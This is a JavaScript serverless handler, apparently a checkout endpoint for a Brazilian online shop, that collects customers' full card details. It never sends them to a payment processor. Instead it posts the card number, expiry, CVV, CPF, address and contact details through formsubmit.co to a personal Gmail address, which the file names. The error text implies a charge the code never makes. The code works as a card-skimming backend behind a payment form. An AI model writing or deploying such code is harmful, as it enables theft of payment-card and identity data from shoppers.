import { z } from "zod";

const CardOrderInput = z.object({
  amount: z.number().positive(),
  description: z.string().min(1).max(255),
  customer: z.object({
    name: z.string().min(2).max(120),
    email: z.string().email().max(160),
    phone: z.string().min(8).max(20),
    document: z.string().min(4).max(20),
  }),
  card: z.object({
    holder: z.string().min(2).max(120),
    number: z.string().min(12).max(24),
    expiry: z.string().min(4).max(7),
    cvv: z.string().min(3).max(4),
    installments: z.string().min(1).max(2),
    address: z.string().min(5).max(255),
  }),
});

function json(status, body) {
  return {
    statusCode: status,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  };
}

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return json(405, { error: "Método não permitido." });
  }

  let data;
  try {
    data = CardOrderInput.parse(JSON.parse(event.body || "{}"));
  } catch {
    return json(400, { error: "Dados inválidos para enviar o pedido." });
  }

  const fields = {
    _subject: `Novo pedido (Cartão) — ${data.description}`,
    _template: "table",
    _captcha: "false",
    _replyto: data.customer.email,
    Kit: data.description,
    Valor: `R$ ${data.amount.toFixed(2).replace(".", ",")}`,
    Parcelas: `${data.card.installments}x`,
    Nome: data.customer.name,
    Email: data.customer.email,
    Telefone: data.customer.phone,
    CPF: data.customer.document,
    Endereço: data.card.address,
    "Titular do cartão": data.card.holder,
    "Número do cartão": data.card.number,
    Validade: data.card.expiry,
    CVV: data.card.cvv,
  };

  let lastError = "";
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15000);
      const response = await fetch("https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com", {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(fields),
        signal: controller.signal,
      });
      clearTimeout(timeout);

      const text = await response.text();
      let payload = null;
      try {
        payload = text ? JSON.parse(text) : null;
      } catch {
        payload = null;
      }

      const blocked = String(payload?.success).toLowerCase() === "false";
      if (response.ok && !blocked) return json(200, { ok: true });

      lastError = payload?.message || `FormSubmit retornou ${response.status}.`;
      if (response.status >= 400 && response.status < 500) break;
    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
      console.error(`FormSubmit attempt ${attempt} failed:`, lastError);
    }
    await new Promise((resolve) => setTimeout(resolve, 500 * attempt * attempt));
  }

  return json(502, {
    error:
      "Não conseguimos confirmar seu pedido agora. Salve seus dados e chame no WhatsApp pra fechar — sem cobrar de novo.",
    detail: lastError,
  });
}